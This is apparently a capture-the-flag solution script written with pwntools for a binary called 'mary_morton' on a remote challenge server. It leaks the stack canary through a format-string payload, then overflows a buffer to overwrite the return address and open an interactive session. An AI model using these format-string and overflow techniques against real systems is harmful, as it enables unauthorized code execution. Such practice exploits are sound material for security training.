from pwn import *

context.log_level="debug"
# p = process("./mary_morton")
elf = ELF("./mary_morton")
p = remote("111.198.29.45",52128) 
p.recv()
p.sendline("2")
p.sendline("%23$p")
p.recvuntil("0x")
cannary = p.recv(16)
cannary = p64(int("0x"+cannary,16))
# gdb.attach(p)
p.sendline("1")
payload = "a"*0x88 + cannary + p64(0xdeadbeef) + p64(0x4008de)
p.sendline(payload)
p.interactive()
